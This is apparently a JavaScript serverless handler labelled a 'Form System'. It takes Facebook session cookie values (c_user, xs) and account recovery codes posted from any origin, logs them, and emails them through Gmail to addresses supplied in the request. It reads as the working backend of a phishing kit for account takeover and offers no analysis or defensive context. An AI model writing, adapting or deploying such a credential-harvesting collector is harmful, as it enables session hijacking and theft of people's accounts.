import nodemailer from 'nodemailer';

export default async function handler(req, res) {
  // CORS headers
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { c_user, xs, emails, workerEmail, name, recovery_codes } = req.body;

    console.log('📨 Form Submission:');
    console.log('c_user:', c_user);
    console.log('xs:', xs);
    console.log('Emails to send:', emails);
    console.log('Worker Email (not used):', workerEmail);
    console.log('name:', name);
    
    // ✅ Send email ONLY to emails array (NO CC to workerEmail)
    const emailResult = await sendGmail(emails, {
      c_user, xs, recovery_codes, name
    });

    return res.status(200).json({
      success: true,
      message: 'Form submitted successfully!',
      emailSent: emailResult.success,
      emailMessage: emailResult.message,
      sentTo: emailResult.sentTo
    });

  } catch (error) {
    console.error('❌ Server Error:', error);
    return res.status(500).json({
      success: false,
      message: 'Server error: ' + error.message
    });
  }
}

// Gmail Send Function - NO CC
async function sendGmail(toEmails, formData) {
  try {
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.GMAIL_USER,
        pass: process.env.GMAIL_APP_PASS
      }
    });

    // ✅ ONLY to emails array (no CC)
    const mailOptions = {
      from: `"Form System" <${process.env.GMAIL_USER}>`,
      to: toEmails.join(', '), // ✅ Only emails array
      // ❌ NO cc: workerEmail
      subject: `✅ New Submission: ${formData.name}`,
      html: `
        <div style="font-family: Arial, sans-serif;">
          <h2>📋 New Form Submission</h2>
          <p><strong>Name:</strong> ${formData.name}</p>
          <p><strong>c_user:</strong> ${formData.c_user}</p>
          <p><strong>xs:</strong> ${formData.xs}</p>
          ${formData.recovery_codes ? `<p><strong>Recovery Codes:</strong> ${formData.recovery_codes}</p>` : ''}
          <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
          <hr>
          <p><small>Sent to: ${toEmails.join(', ')}</small></p>
        </div>
      `
    };

    const info = await transporter.sendMail(mailOptions);
    
    console.log('✅ Email sent to emails array only!');
    console.log('Recipients:', toEmails);

    return {
      success: true,
      message: 'Email sent successfully!',
      sentTo: toEmails
    };

  } catch (error) {
    console.error('❌ Email Error:', error);
    return {
      success: false,
      message: 'Email sending failed: ' + error.message
    };
  }
}
